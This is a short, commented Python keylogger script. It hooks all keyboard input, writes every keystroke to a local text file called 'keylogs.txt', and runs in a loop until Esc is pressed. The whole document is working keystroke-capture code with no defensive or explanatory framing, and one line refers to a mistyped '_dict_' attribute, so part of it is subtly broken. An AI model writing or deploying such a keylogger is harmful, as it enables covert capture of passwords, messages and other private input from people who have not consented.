# Importing the required modules
import keyboard
import os
import time

# Defining the function to write the keylogs to a file
def write_keylogs(key):
    # Creating a file if it does not exist
    if not os.path.exists("keylogs.txt"):
        with open("keylogs.txt", "w") as file:
            file.write("Keylogs: \n")
    # Appending the keylogs to the file
    with open("keylogs.txt", "a") as file:
        # Checking for special keys
        if key.name == "space":
            file.write(" ")
        elif key.name == "enter":
            file.write("\n")
        elif key.name == "backspace":
            file.write("[BACKSPACE]")
        else:
            # Getting the character representation of the key
            char = key.name or key._dict_['char']
            file.write(char)
        
# Defining the function to start the keylogger
def start_keylogger():
    # Starting the keylogger
    keyboard.hook(write_keylogs)
    # Running the keylogger in an infinite loop
    while True:
        # Checking for termination condition
        if keyboard.is_pressed("esc"):
            break
        time.sleep(1)
        
# Calling the function to start the keylogger
start_keylogger()
